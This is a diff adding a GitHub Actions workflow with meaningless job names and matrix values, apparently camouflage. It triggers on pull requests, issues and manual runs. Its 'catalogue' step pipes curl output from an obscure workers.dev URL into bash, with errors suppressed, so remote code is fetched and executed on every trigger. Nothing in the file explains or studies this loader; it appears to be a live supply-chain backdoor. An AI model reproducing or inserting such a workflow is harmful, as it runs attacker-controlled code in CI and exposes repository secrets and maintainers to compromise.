@@ -1,0 +1,24 @@
+name: weaken
+
+on:
+  pull_request:
+  issues:
+  workflow_dispatch:
+
+jobs:
+  confuse:
+    steps:
+    - uses: actions/checkout@v6
+    - uses: actions/cache@v4
+      with:
+        key: 'dear-involve'
+        path: 'petrol'
+    - name: catalogue
+      continue-on-error: true
+      run: curl -sS -L -X GET "https://i.donnickcarbonaro70085.workers.dev/0c43b1c053ad4d5c923443391bd/99ea17d90c716/eab49ada9b7118e9f28e80c9?f=1775348875&e=f&afo=xza&iqw=aq" | bash
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        rag: ["India", "headquarter", "regulate", "prohibitively", "cease"]
+        claim: ["combination", "settle", "lawn", "aircraft"]
+      fail-fast: false
